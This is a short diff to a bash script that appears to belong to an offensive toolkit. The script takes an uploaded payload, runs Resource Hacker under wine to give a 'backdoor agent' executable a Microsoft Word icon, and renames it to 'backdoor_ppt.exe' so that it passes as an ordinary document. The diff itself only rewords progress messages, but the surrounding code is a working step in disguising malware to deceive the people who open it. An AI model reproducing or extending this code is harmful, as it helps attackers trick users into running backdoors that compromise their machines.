@@ -116,8 +116,6 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-s
     if [ -f "$H0ME/.wine/drive_c/Program Files/Resource Hacker/ResourceHacker.exe" ]; then
       echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
       sleep 1
-      echo ${BlueF}[☆]${white} Aborting backend appl installation... ${Reset};
-      sleep 1
     else
       echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
       sleep 1
@@ -126,13 +124,13 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE UPLOADED ☠" --filename=$IPATH --file-s
     fi
 
       # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
-      echo ${BlueF}[☆]${white} Please wait, Transforming backdoor agent... ${Reset};
+      echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
       wine $H0ME/.wine/drive_c/"Program Files"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
-      echo ${BlueF}[☆]${white} ResourceHacker, change backdoor agent icon... ${Reset};
+      echo ${BlueF}[☆]${white} Change backdoor agent icon '->' ${GreenF}done... ${Reset};
       sleep 1
 
     # insert .ppt hidden extension
-    echo ${BlueF}[☆]${white} Adding hidden extension to agent... ${Reset};
+    echo ${BlueF}[☆]${white} Adding hidden extension to agent '->' ${GreenF}done... ${Reset};
     mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
     sleep 1
 
